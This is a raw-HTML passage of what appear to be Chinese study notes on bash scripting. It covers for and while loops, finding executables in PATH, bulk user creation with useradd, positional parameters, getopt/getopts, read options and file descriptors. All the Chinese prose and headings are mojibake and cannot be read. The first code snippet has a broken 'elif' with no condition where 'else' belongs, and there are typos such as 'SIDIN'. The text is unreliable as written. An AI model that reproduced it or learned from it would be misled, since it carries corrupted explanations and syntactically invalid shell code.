class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> /home/rich/*<br><span class="hljs-keyword">do</span><br>  <span class="hljs-keyword">if</span> [ -d <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span> ]<br>  <span class="hljs-keyword">then</span><br>      <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span> is a directory&quot;</span><br>  <span class="hljs-keyword">elif</span><br>      <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span> is a file&quot;</span><br>  <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span> &gt; output.txt<br></code></pre></td></tr></table></figure><h2 id="13-9-å®ä¾‹"><a href="#13-9-å®ä¾‹" class="headerlink" title="13.9 å®ä¾‹"></a>13.9 å®ä¾‹</h2><h3 id="13-9-1-æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶"><a href="#13-9-1-æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="13.9.1 æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶"></a>13.9.1 æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># finding files in the PATH</span><br><br>IFS=:<br><span class="hljs-keyword">for</span> folder <span class="hljs-keyword">in</span> <span class="hljs-variable">$PATH</span><br><span class="hljs-keyword">do</span> <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$folder</span>:&quot;</span><br>    <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> <span class="hljs-variable">$folder</span>/*<br>    <span class="hljs-keyword">do</span> <br>        <span class="hljs-keyword">if</span> [ -x <span class="hljs-variable">$file</span> ]<br>        <span class="hljs-keyword">then</span> <br>           <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;   <span class="hljs-variable">$file</span>&quot;</span><br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h3 id="13-9-2-åˆ›å»ºå¤šä¸ªç”¨æˆ·è´¦æˆ·"><a href="#13-9-2-åˆ›å»ºå¤šä¸ªç”¨æˆ·è´¦æˆ·" class="headerlink" title="13.9.2 åˆ›å»ºå¤šä¸ªç”¨æˆ·è´¦æˆ·"></a>13.9.2 åˆ›å»ºå¤šä¸ªç”¨æˆ·è´¦æˆ·</h3><p>æŠŠæ•°æ®ä»æ–‡ä»¶ä¸­é€å…¥whileå‘½ä»¤, åœ¨whileå‘½ä»¤å°¾éƒ¨ä½¿ç”¨ä¸€ä¸ªé‡å®šå‘ç¬¦å°±å¯ä»¥äº†:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># process new user accounts</span><br><br>input=<span class="hljs-string">&quot;users.csv&quot;</span><br><span class="hljs-keyword">while</span> IFS=<span class="hljs-string">&#x27;,&#x27;</span> <span class="hljs-built_in">read</span> -r userid name<br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;adding <span class="hljs-variable">$userid</span>&quot;</span><br>  useradd -c <span class="hljs-string">&quot;<span class="hljs-variable">$name</span>&quot;</span> -m <span class="hljs-variable">$userid</span><br><span class="hljs-keyword">done</span> &lt; <span class="hljs-string">&quot;<span class="hljs-variable">$input</span>&quot;</span><br></code></pre></td></tr></table></figure><h1 id="ç¬¬åå››ç« -å¤„ç†ç”¨æˆ·è¾“å…¥"><a href="#ç¬¬åå››ç« -å¤„ç†ç”¨æˆ·è¾“å…¥" class="headerlink" title="ç¬¬åå››ç«  å¤„ç†ç”¨æˆ·è¾“å…¥"></a>ç¬¬åå››ç«  å¤„ç†ç”¨æˆ·è¾“å…¥</h1><h2 id="14-1-å‘½ä»¤è¡Œå‚æ•°"><a href="#14-1-å‘½ä»¤è¡Œå‚æ•°" class="headerlink" title="14.1 å‘½ä»¤è¡Œå‚æ•°"></a>14.1 å‘½ä»¤è¡Œå‚æ•°</h2><h3 id="14-1-1-è¯»å–å‚æ•°"><a href="#14-1-1-è¯»å–å‚æ•°" class="headerlink" title="14.1.1 è¯»å–å‚æ•°"></a>14.1.1 è¯»å–å‚æ•°</h3><p>positional parameter, ä½ç½®å‚æ•°ï¼Œä¸€ä¸ªç‰¹æ®Šå˜é‡ï¼Œç”±bash shellåˆ†é…ç»™è¾“å…¥åˆ°å‘½ä»¤è¡Œçš„æ‰€æœ‰å‚æ•°. ä¹Ÿå°±æ˜¯ $0, $1 è¿™äº›.</p><p>$0æ˜¯ç¨‹åºåï¼Œ$1æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç›´åˆ°$9.</p><p>å°†æ–‡æœ¬å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ é€’æ—¶ï¼Œå¼•å·å¹¶éæ•°æ®å¾—ä¸€éƒ¨åˆ†, å®ƒä»¬åªæ˜¯è¡¨æ˜æ•°æ®çš„èµ·å§‹ä½ç½®.</p><p>åœ¨ç¬¬ä¹ä¸ªå˜é‡ä¹‹åï¼Œå¿…é¡»åœ¨å˜é‡æ•°å­—å‘¨å›´åŠ ä¸ŠèŠ±æ‹¬å·, å¦‚${10}.</p><h3 id="14-1-2-è¯»å–è„šæœ¬å"><a href="#14-1-2-è¯»å–è„šæœ¬å" class="headerlink" title="14.1.2 è¯»å–è„šæœ¬å"></a>14.1.2 è¯»å–è„šæœ¬å</h3><p>å½“ä¼ ç»™$0å˜é‡çš„å®é™…å­—ç¬¦ä¸²ä¸ä»…ä»…æ˜¯è„šæœ¬åï¼Œè€Œæ˜¯å®Œæ•´çš„è„šæœ¬è·¯å¾„æ—¶ï¼Œå˜é‡$0å°±ä¼šä½¿ç”¨æ•´ä¸ªè·¯å¾„.</p><p><code>basename</code>å‘½ä»¤ä¼šè¿”å›ä¸åŒ…å«è·¯å¾„çš„è„šæœ¬å.</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">name</span>=$(basename <span class="hljs-variable">$0</span>)<br></code></pre></td></tr></table></figure><h3 id="14-1-3-æµ‹è¯•å‚æ•°"><a href="#14-1-3-æµ‹è¯•å‚æ•°" class="headerlink" title="14.1.3 æµ‹è¯•å‚æ•°"></a>14.1.3 æµ‹è¯•å‚æ•°</h3><p>åœ¨ä½¿ç”¨å‚æ•°å‰ä¸€å®šè¦æ£€æŸ¥å…¶ä¸­æ˜¯å¦å­˜åœ¨æ•°æ®ã€‚</p><h2 id="14-2-ç‰¹æ®Šå‚æ•°å˜é‡"><a href="#14-2-ç‰¹æ®Šå‚æ•°å˜é‡" class="headerlink" title="14.2 ç‰¹æ®Šå‚æ•°å˜é‡"></a>14.2 ç‰¹æ®Šå‚æ•°å˜é‡</h2><h3 id="14-2-1-å‚æ•°ç»Ÿè®¡"><a href="#14-2-1-å‚æ•°ç»Ÿè®¡" class="headerlink" title="14.2.1 å‚æ•°ç»Ÿè®¡"></a>14.2.1 å‚æ•°ç»Ÿè®¡</h3><p>ç‰¹æ®Šå˜é‡<code>$#</code>è®°å½•å‘½ä»¤è¡Œå‚æ•°çš„ä¸ªæ•°.</p><p>é€šè¿‡ä½¿ç”¨å‰æµ‹è¯•å‚æ•°çš„æ€»æ•°:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span> [ <span class="hljs-symbol">$</span># -<span class="hljs-keyword">ne</span> <span class="hljs-number">2</span> ]<br></code></pre></td></tr></table></figure><p>åŒæ—¶ï¼Œ<code>$&#123;!#&#125;</code>è¡¨ç¤ºæœ€åä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°. åœ¨èŠ±æ‹¬å·å†…ä¸èƒ½ä½¿ç”¨ç¾å…ƒç¬¦å·ï¼Œéœ€å°†å…¶æ›¿æ¢ä¸º<code>!</code>.</p><h3 id="14-2-2-æŠ“å–æ‰€æœ‰çš„æ•°æ®"><a href="#14-2-2-æŠ“å–æ‰€æœ‰çš„æ•°æ®" class="headerlink" title="14.2.2 æŠ“å–æ‰€æœ‰çš„æ•°æ®"></a>14.2.2 æŠ“å–æ‰€æœ‰çš„æ•°æ®</h3><p><code>$*</code>å˜é‡ä¼šå°†å‘½ä»¤è¡Œä¸Šæä¾›çš„æ‰€æœ‰å‚æ•°å½“ä½œä¸€ä¸ªå•è¯ä¿å­˜.</p><p><code>$@</code>å˜é‡ä¼šå°†å‘½ä»¤è¡Œä¸Šæä¾›çš„æ‰€æœ‰å‚æ•°å½“ä½œç»Ÿä¸€å­—ç¬¦ä¸²ä¸­çš„å¤šä¸ªç‹¬ç«‹çš„å•è¯.</p><p>æ³¨æ„ä½¿ç”¨æ—¶æ·»åŠ åŒå¼•å·.</p><h2 id="14-3-ç§»åŠ¨å˜é‡"><a href="#14-3-ç§»åŠ¨å˜é‡" class="headerlink" title="14.3 ç§»åŠ¨å˜é‡"></a>14.3 ç§»åŠ¨å˜é‡</h2><p><code>shift</code>å‘½ä»¤ï¼Œå°†æ¯ä¸ªå‚æ•°å˜é‡å‘å·¦ç§»åŠ¨ä¸€ä¸ªä½ç½®ï¼Œ$0ä¸ä¼šæ”¹å˜.</p><p>ç»™<code>shift</code>å‘½ä»¤æä¾›å‚æ•°ï¼Œå¯ä»¥ä¸€æ¬¡ç§»åŠ¨å¤šä¸ªä½ç½®.</p><h2 id="14-4-å¤„ç†é€‰é¡¹"><a href="#14-4-å¤„ç†é€‰é¡¹" class="headerlink" title="14.4 å¤„ç†é€‰é¡¹"></a>14.4 å¤„ç†é€‰é¡¹</h2><p>é€‰é¡¹æ˜¯è·Ÿåœ¨å•ç ´æŠ˜å·åé¢çš„å•ä¸ªå­—æ¯ï¼Œä»–èƒ½æ”¹å˜å‘½ä»¤çš„è¡Œä¸ºã€‚</p><h3 id="14-4-1-æŸ¥æ‰¾é€‰é¡¹"><a href="#14-4-1-æŸ¥æ‰¾é€‰é¡¹" class="headerlink" title="14.4.1 æŸ¥æ‰¾é€‰é¡¹"></a>14.4.1 æŸ¥æ‰¾é€‰é¡¹</h3><p>ç”¨<code>case</code>è¯­å¥æ¥åˆ¤æ–­æŸä¸ªå‚æ•°æ˜¯å¦ä¸ºé€‰é¡¹.</p><h4 id="åˆ†ç¦»é€‰é¡¹å’Œå‚æ•°"><a href="#åˆ†ç¦»é€‰é¡¹å’Œå‚æ•°" class="headerlink" title="åˆ†ç¦»é€‰é¡¹å’Œå‚æ•°"></a>åˆ†ç¦»é€‰é¡¹å’Œå‚æ•°</h4><p>shellä¼šç”¨åŒç ´æŠ˜å·(â€“)æ¥è¡¨æ˜é€‰é¡¹åˆ—è¡¨ç»“æŸï¼Œå…¶åçš„å‚æ•°ä¼šè¢«å½“ä½œå‚æ•°å¤„ç†è€Œä¸æ˜¯é€‰é¡¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">  <br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-comment"># extracting command line options as parameters</span><br><span class="hljs-comment">#</span><br><span class="hljs-built_in">echo</span> <br><span class="hljs-keyword">while</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> ]<br><span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> <span class="hljs-keyword">in</span> <br>        -a) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Found the -a option&quot;</span> ;; <br>        -b) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Found the -b option&quot;</span> ;;<br>        -c) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Found the -c option&quot;</span> ;;<br>        --) <span class="hljs-built_in">shift</span><br>            <span class="hljs-built_in">break</span> ;;<br>         *) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span> is not an option&quot;</span> ;;<br>     <span class="hljs-keyword">esac</span><br>     <span class="hljs-built_in">shift</span><br> <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>åˆ©ç”¨<code>shift</code>æ¯è°ƒç”¨ä¸€ä¸ªé€‰é¡¹å°±ç§»é™¤ä¸€ä¸ªã€‚</p><p>åœ¨Linuxä¸­ï¼Œåˆå¹¶é€‰é¡¹æ˜¯ä¸€ä¸ªå¾ˆå¸¸è§çš„åšæ³•ã€‚</p><h3 id="14-4-2-ä½¿ç”¨getoptå‘½ä»¤"><a href="#14-4-2-ä½¿ç”¨getoptå‘½ä»¤" class="headerlink" title="14.4.2 ä½¿ç”¨getoptå‘½ä»¤"></a>14.4.2 ä½¿ç”¨getoptå‘½ä»¤</h3><p>è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨åœ¨äº <mark>æ ¼å¼åŒ–å‘½ä»¤è¡Œå‚æ•°</mark>.<br>getoptå‘½ä»¤å¯ä»¥è¯†åˆ«å‘½ä»¤è¡Œå‚æ•°.</p><p>getoptå‘½ä»¤å¯ä»¥æ¥å—ä¸€ç³»åˆ—ä»»æ„å½¢å¼çš„å‘½ä»¤è¡Œé€‰é¡¹å’Œå‚æ•°ï¼Œå¹¶è‡ªåŠ¨å°†å®ƒä»¬è½¬æ¢æˆé€‚å½“çš„æ ¼å¼:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">getopt optstring parameters</span><br></code></pre></td></tr></table></figure><p>åœ¨æ¯ä¸ªéœ€è¦å‚æ•°å€¼çš„é€‰é¡¹å­—æ¯åé¢åŠ ä¸€ä¸ªå†’å·:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">getopt ab:<span class="hljs-built_in">cd</span> -a -b test1 -<span class="hljs-built_in">cd</span> test2 testt3</span><br></code></pre></td></tr></table></figure><p>è¿™æ—¶, å‘½ä»¤è¡Œå‚æ•°å°±è¢«æ ¼å¼åŒ–ä¸º:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">-<span class="hljs-selector-tag">a</span> -<span class="hljs-selector-tag">b</span> test1 -c -d -- test2 test3<br></code></pre></td></tr></table></figure><p><code>c</code> å’Œ <code>d</code> æ˜¯ä¸¤ä¸ªå‘½ä»¤è¡Œé€‰é¡¹, æ‰€ä»¥æŠŠ <code>-cd</code> å˜æˆäº† <code>-c -d</code>.</p><p>å› ä¸º <code>-d</code> æ²¡æœ‰å‚æ•°, æ‰€ä»¥åé¢ä¼šæœ‰ <code>--</code> æ¥åˆ†éš”.</p><p>åœ¨è¿™é‡Œçš„æ„æ€å°±æ˜¯, <code>b</code> è¿™ä¸ªé€‰é¡¹éœ€è¦å‚æ•°.</p><h4 id="2-åœ¨è„šæœ¬ä¸­ä½¿ç”¨-getopt"><a href="#2-åœ¨è„šæœ¬ä¸­ä½¿ç”¨-getopt" class="headerlink" title="2. åœ¨è„šæœ¬ä¸­ä½¿ç”¨ getopt"></a>2. åœ¨è„šæœ¬ä¸­ä½¿ç”¨ getopt</h4><p><code>set</code> å‘½ä»¤èƒ½å¤Ÿå¤„ç† shell ä¸­çš„å„ç§å˜é‡</p><h3 id="14-4-3-ä½¿ç”¨æ›´é«˜çº§çš„-getopts"><a href="#14-4-3-ä½¿ç”¨æ›´é«˜çº§çš„-getopts" class="headerlink" title="14.4.3 ä½¿ç”¨æ›´é«˜çº§çš„ getopts"></a>14.4.3 ä½¿ç”¨æ›´é«˜çº§çš„ getopts</h3><p>getopts å†…å»ºäº bash shell, æ¯” getopt å¤šäº†ä¸€äº›æ‰©å±•åŠŸèƒ½.</p><p>æ¯æ¬¡è°ƒç”¨ getopts, å®ƒä¸€æ¬¡åªå¤„ç†å‘½ä»¤è¡Œä¸Šæ£€æµ‹åˆ°çš„ä¸€ä¸ªå‚æ•°. å¤„ç†å®Œæ‰€æœ‰å‚æ•°å, å®ƒä¼šé€€å‡ºå¹¶è¿”å›ä¸€ä¸ªå¤§äº 0 çš„æ¨å‡ºçŠ¶æ€ç .</p><p>æ ¼å¼:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">getopts</span> optstring variabel<br></code></pre></td></tr></table></figure><p>è¦å»æ‰é”™è¯¯ä¿¡æ¯çš„è¯, å¯ä»¥åœ¨ optstring ä¹‹å‰åŠ ä¸€ä¸ªå†’å·. </p><p>getopts å‘½ä»¤ä¼šå°†å½“å‰å‚æ•°ä¿å­˜åœ¨å‘½ä»¤è¡Œä¸­å®šä¹‰çš„ variable ä¸­.</p><p>getopts å‘½ä»¤ä¼šç”¨åˆ°ä¸¤ä¸ªç¯å¢ƒå˜é‡:</p><ul><li>OPTARG : ä¼šä¿å­˜é€‰é¡¹åè·Ÿçš„å‚æ•°å€¼</li><li>OPTIND : ä¿å­˜å‚æ•°åˆ—è¡¨ä¸­ getopts æ­£åœ¨å¤„ç†çš„å‚æ•°çš„ä½ç½®, æ¯•ç«Ÿè¿™ä¸ªå‡½æ•°ä¸€æ¬¡åªå¤„ç†ä¸€ä¸ªé€‰é¡¹. ç¬¬ä¸€ä¸ªé€‰é¡¹çš„ä½ç½®ä¸º 1</li></ul><p>getopts å‘½ä»¤è§£æå‘½ä»¤è¡Œé€‰é¡¹æ—¶ä¼šç§»é™¤å¼€å¤´çš„å•ç ´æŠ˜å·, å› æ­¤åœ¨ case ä¸­å®šä¹‰æ—¶ä¸ç”¨å•ç ´æŠ˜å·.</p><p>getopts å‘½ä»¤å¯ä»¥åœ¨å‚æ•°å€¼ä¹‹é—´åŠ ç©ºæ ¼, å¦‚ <code>&quot;test1 test2&quot;</code>, ä¹Ÿå¯ä»¥æŠŠé€‰é¡¹å­—æ¯å’Œå‚æ•°å€¼æ”¾åœ¨ä¸€èµ·ä½¿ç”¨, è€Œä¸åŠ ç©ºæ ¼ <code>./test.sh -abtest1</code>.</p><p>getopts è¿˜èƒ½å°†å‘½ä»¤è¡Œä¸Šæ‰¾åˆ°çš„æ‰€æœ‰æœªå®šä¹‰çš„é€‰é¡¹ç»Ÿä¸€è¾“å‡ºæˆé—®å·.</p><p>åœ¨ getopts æ¯å¤„ç†ä¸€ä¸ªé€‰é¡¹, å…¶ä¼šæŠŠ OPTIND ç¯å¢ƒå˜é‡å€¼åŠ ä¸€.</p><h2 id="14-5-å°†é€‰é¡¹æ ‡å‡†åŒ–"><a href="#14-5-å°†é€‰é¡¹æ ‡å‡†åŒ–" class="headerlink" title="14.5 å°†é€‰é¡¹æ ‡å‡†åŒ–"></a>14.5 å°†é€‰é¡¹æ ‡å‡†åŒ–</h2><p>Linux å‘½ä»¤è¡Œä¸­çš„é€‰é¡¹å¥½å¤šå·²ç»æœ‰äº†ä¸æˆæ–‡çš„å«ä¹‰.</p><h2 id="14-6-è·å–ç”¨æˆ·è¾“å…¥"><a href="#14-6-è·å–ç”¨æˆ·è¾“å…¥" class="headerlink" title="14.6 è·å–ç”¨æˆ·è¾“å…¥"></a>14.6 è·å–ç”¨æˆ·è¾“å…¥</h2><h3 id="14-6-1-åŸºæœ¬çš„è¯»å–"><a href="#14-6-1-åŸºæœ¬çš„è¯»å–" class="headerlink" title="14.6.1 åŸºæœ¬çš„è¯»å–"></a>14.6.1 åŸºæœ¬çš„è¯»å–</h3><p>read å‘½ä»¤ä»æ ‡å‡†è¾“å…¥æˆ–å¦ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦å·ä¸­æ¥å—è¾“å…¥, åœ¨æ”¶åˆ°è¾“å…¥å, read å‘½ä»¤ä¼šå°†æ•°æ®æ”¾è¿›ä¸€ä¸ªå˜é‡.</p><p>ä¾‹å­:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash</span><br><span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;Enter your name:&quot;</span><br><span class="hljs-built_in">read</span> name<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello <span class="hljs-variable">$name</span>, welcome to my program&quot;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>echo</code> çš„ <code>-n</code> é€‰é¡¹è¡¨ç¤ºä¸ä¼šåœ¨å­—ç¬¦ä¸²æœ«å°¾è¾“å‡ºæ¢è¡Œç¬¦.</p><p>è¿™é‡Œ, read æŠŠè¯»å–çš„å€¼å­˜å…¥ <code>name</code> è¿™ä¸ªå˜é‡.</p><p>read çš„ <code>-p</code> é€‰é¡¹, å…è®¸åœ¨å‘½ä»¤è¡Œç›´æ¥æŒ‡å®šæç¤ºç¬¦:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash</span><br><span class="hljs-built_in">read</span> -p <span class="hljs-string">&quot;Please enter your age: &quot;</span> age<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>Please enter your age: </code> å°±å’Œä¹‹å‰ä½¿ç”¨ <code>echo</code> æ˜¯ä¸€æ ·çš„.</p><p>å¯ä»¥æŒ‡å®šå¤šä¸ªå˜é‡.</p><p>å¦‚æœä¸æŒ‡å®šå˜é‡, å€¼ä¼šè¢«å­˜åœ¨ <code>REPLY</code> è¿™ä¸ªç¯å¢ƒå˜é‡ä¸­.</p><h3 id="14-6-2-è¶…æ—¶"><a href="#14-6-2-è¶…æ—¶" class="headerlink" title="14.6.2 è¶…æ—¶"></a>14.6.2 è¶…æ—¶</h3><p>ä½¿ç”¨ <code>-t</code> é€‰é¡¹, æŒ‡å®š read å‘½ä»¤ç­‰å¾…è¾“å…¥çš„ç§’æ•°, å½“è®¡æ—¶å™¨è¿‡æœŸå, read å‘½ä»¤ä¼šè¿”å›ä¸€ä¸ªéé›¶é€€å‡ºçŠ¶æ€ç .</p><p>ä½¿ç”¨ <code>-n</code> é€‰é¡¹, å¯ä»¥è®© read å‘½ä»¤åœ¨è¯»å–æŒ‡å®šå­—ç¬¦æ•°åé€€å‡º. å¦‚ <code>read -n1</code> è¡¨ç¤ºæ¥å—å•ä¸ªå­—ç¬¦</p><h3 id="14-6-3-éšè—æ–¹å¼è¯»å–"><a href="#14-6-3-éšè—æ–¹å¼è¯»å–" class="headerlink" title="14.6.3 éšè—æ–¹å¼è¯»å–"></a>14.6.3 éšè—æ–¹å¼è¯»å–</h3><p><code>-s</code> é€‰é¡¹, é¿å…åœ¨ read å‘½ä»¤ä¸­è¾“å…¥çš„æ•°æ®å‡ºç°åœ¨æ˜¾ç¤ºå™¨ä¸Š, å®é™…ä¸Š, æ•°æ®ä¼šè¢«æ˜¾ç¤º, åªæ˜¯ read å‘½ä»¤ä¼šå°†æ–‡æœ¬é¢œè‰²è®¾æˆè·ŸèƒŒæ™¯è‰²ä¸€æ ·.</p><h3 id="14-6-4-ä»æ–‡ä»¶ä¸­è¯»å–"><a href="#14-6-4-ä»æ–‡ä»¶ä¸­è¯»å–" class="headerlink" title="14.6.4 ä»æ–‡ä»¶ä¸­è¯»å–"></a>14.6.4 ä»æ–‡ä»¶ä¸­è¯»å–</h3><p>æ¯æ¬¡è°ƒç”¨ read å‘½ä»¤, ä»–éƒ½ä¼šä»æ–‡ä»¶ä¸­è¯»å–ä¸€è¡Œæ–‡æœ¬, å½“æ–‡ä»¶ä¸­å†æ²¡æœ‰å†…å®¹æ—¶, read å‘½ä»¤é€€å‡ºå¹¶è¿”å›éé›¶çŠ¶æ€ç .</p><p>æœ€å¸¸è§çš„æ–¹æ³•æ˜¯å¯¹æ–‡ä»¶ä½¿ç”¨ cat å‘½ä»¤, å°†ç»“æœé€šè¿‡ç®¡é“ç›´æ¥ä¼ ç»™å«æœ‰ read å‘½ä»¤çš„ while å‘½ä»¤.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash    </span><br>count=1<br><span class="hljs-built_in">cat</span> <span class="hljs-built_in">test</span> | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line <br><span class="hljs-keyword">do</span> <br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Line <span class="hljs-variable">$count</span>: <span class="hljs-variable">$line</span>&quot;</span><br>    count=$[ <span class="hljs-variable">$count</span> + 1 ]<br><span class="hljs-keyword">done</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Finished processing the file&quot;</span><br></code></pre></td></tr></table></figure><h1 id="ç¬¬15ç« -å‘ˆç°æ•°æ®"><a href="#ç¬¬15ç« -å‘ˆç°æ•°æ®" class="headerlink" title="ç¬¬15ç«  å‘ˆç°æ•°æ®"></a>ç¬¬15ç«  å‘ˆç°æ•°æ®</h1><h2 id="15-1-ç†è§£è¾“å…¥å’Œè¾“å‡º"><a href="#15-1-ç†è§£è¾“å…¥å’Œè¾“å‡º" class="headerlink" title="15.1 ç†è§£è¾“å…¥å’Œè¾“å‡º"></a>15.1 ç†è§£è¾“å…¥å’Œè¾“å‡º</h2><h3 id="15-1-1-æ ‡å‡†æ–‡ä»¶æè¿°ç¬¦"><a href="#15-1-1-æ ‡å‡†æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="15.1.1 æ ‡å‡†æ–‡ä»¶æè¿°ç¬¦"></a>15.1.1 æ ‡å‡†æ–‡ä»¶æè¿°ç¬¦</h3><p>Linux ç³»ç»Ÿå°†æ¯ä¸ªå¯¹è±¡å½“ä½œæ–‡ä»¶å¤„ç†.</p><p>Linux ç”¨æ–‡ä»¶æè¿°ç¬¦ (file descriptor) æ¥æ ‡è¯†æ¯ä¸ªæ–‡ä»¶å¯¹è±¡.</p><p>æ¯ä¸ªè¿›ç¨‹ä¸€æ¬¡æœ€å¤šå¯ä»¥æœ‰ä¹ä¸ªæ–‡ä»¶æè¿°ç¬¦, bash shell ä¿ç•™äº†å‰ä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦.</p><ul><li>0 SIDIN  æ ‡å‡†è¾“å…¥</li><li>1 STDOUT æ ‡å‡†è¾“å‡º</li><li>2 STDERR æ ‡å‡†é”™è¯¯</li></ul><p>å½“å‘½ä»¤ç”Ÿæˆé”™è¯¯æ¶ˆæ¯æ—¶, shell å¹¶æœªå°†é”™è¯¯æ¶ˆæ¯é‡å®šå‘åˆ°è¾“å‡ºé‡å®šå‘æ–‡ä»¶.</p><p>é»˜è®¤æƒ…å†µä¸‹, STDERR æ–‡ä»¶æè¿°ç¬¦å’Œ STDOUT æ–‡ä»¶æè¿°ç¬¦æŒ‡å‘åŒæ ·çš„åœ°æ–¹.</p><h3 id="15-1-2-é‡å®šå‘é”™è¯¯"><a href="#15-1-2-é‡å®šå‘é”™è¯¯" class="headerlink" title="15.1.2 é‡å®šå‘é”™è¯¯"></a>15.1.2 é‡å®šå‘é”™è¯¯</h3><h4 id="1-åªé‡å®šå‘é”™è¯¯"><a href="#1-åªé‡å®šå‘é”™è¯¯" class="headerlink" title="1. åªé‡å®šå‘é”™è¯¯"></a>1. åªé‡å®šå‘é”™è¯¯</h4><p>å¯ä»¥é€‰æ‹©åªé‡å®šå‘é”™è¯¯æ¶ˆæ¯, å°†è¯¥æ–‡ä»¶æè¿°ç¬¦æ”¾åœ¨é‡å®šå‘ç¬¦å·å‰, è¯¥å€¼å¿…é¡»ç´§ç´§åœ°æ”¾åœ¨é‡å®šå‘ç¬¦å·å‰.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ls</span> -al badfile 2&gt; <span class="hljs-built_in">test</span></span><br></code></pre></td></tr></table></figure><h4 id="2-é‡å®šå‘é”™è¯¯å’Œæ•°æ®"><a href="#2-é‡å®šå‘é”™è¯¯å’Œæ•°æ®" class="headerlink" title="2. 